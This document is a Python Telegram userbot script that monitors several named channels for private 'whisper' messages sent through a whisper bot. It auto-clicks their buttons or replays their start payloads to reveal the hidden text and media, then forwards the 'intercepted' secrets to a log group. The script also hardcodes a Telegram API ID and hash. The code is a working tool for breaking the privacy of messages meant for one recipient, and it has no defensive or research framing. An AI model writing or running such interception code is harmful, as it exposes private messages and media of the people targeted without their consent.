import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import MessageEntityUrl, MessageEntityTextUrl

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Tracking context
ctx = {"title": "Target Channel", "link": "#", "time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== 1. CHANNEL HANDLER (AUTO-EXTRACTOR) ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    
    # Message Link
    try:
        chat = await event.get_chat()
        msg_link = f"https://t.me/{chat.username}/{event.id}" if getattr(chat, 'username', None) else f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
    except: msg_link = "#"

    print(f"\n📩 NEW WHISPER DETECTED in [{chat_name}]")

    try:
        payload = None
        
        # --- METHOD 1: Scan for URL Buttons (Advanced Whispers) ---
        for row in event.buttons:
            for btn in row:
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    print(f"🔗 Payload found in URL: {payload}")
                    break
        
        # --- METHOD 2: Click to get Popup (Short Text or Hidden Key) ---
        res = await event.click(0)
        secret_text = ""
        if hasattr(res, 'message') and res.message:
            secret_text = res.message
        elif isinstance(res, str):
            secret_text = res

        # Check if popup text contains the secret key
        if secret_text and "-wh::" in secret_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", secret_text)
            if match:
                payload = match.group(0)
                print(f"📦 Payload found in Popup: {payload}")

        # --- EXECUTION ---
        if payload or "advanced" in secret_text.lower():
            print(f"🚀 Triggering Bot DM for Advanced Content...")
            ctx.update({"title": chat_name, "link": msg_link, "time": start_time})
            
            # Simulate the 'START' button tap by sending /start <payload>
            final_cmd = f"/start {payload}" if payload else "/start"
            await client.send_message(WHISPER_BOT_ID, final_cmd)
            
        elif secret_text:
            # Normal Short Whisper
            elapsed = round((time.perf_counter() - start_time) * 1000, 2)
            log = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{secret_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log)
            print(f"✅ Short Whisper Forwarded ({elapsed}ms)")

    except Exception as e:
        print(f"❌ Error: {e}")

# ==================== 2. BOT DM MONITOR (MEDIA REDIRECTOR) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Ignore bot's setup/instruction texts
    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "/start", "button below"]):
        return

    print(f"📩 BOT DM RESPONSE CAPTURED!")

    try:
        now = time.perf_counter()
        if now - ctx["time"] > 60: ctx["time"] = now # Fallback
        
        elapsed = round((now - ctx["time"]) * 1000, 2)
        m_type = "Advanced Whisper"
        if event.photo: m_type = "Photo"
        elif event.voice: m_type = "Voice Note"
        elif event.video: m_type = "Video"
        
        log = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {m_type}]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {ctx['title']}\n"
            f"⚡ **Speed:** {elapsed} ms\n"
            f"🔗 [Message Link]({ctx['link']})"
        )

        # Forward Media + Caption to Group
        await client.send_message(LOG_GROUP_ID, log, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Advanced Content Redirected successfully!")

    except Exception as e:
        print(f"❌ DM Error: {e}")

# ==================== WEB SERVER & STARTUP ====================
async def handle_ping(request): return web.Response(text="Active")
async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    await client.get_dialogs()
    print("🔥 BOT IS LIVE: Auto-Tap & Media Redirect ON!")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
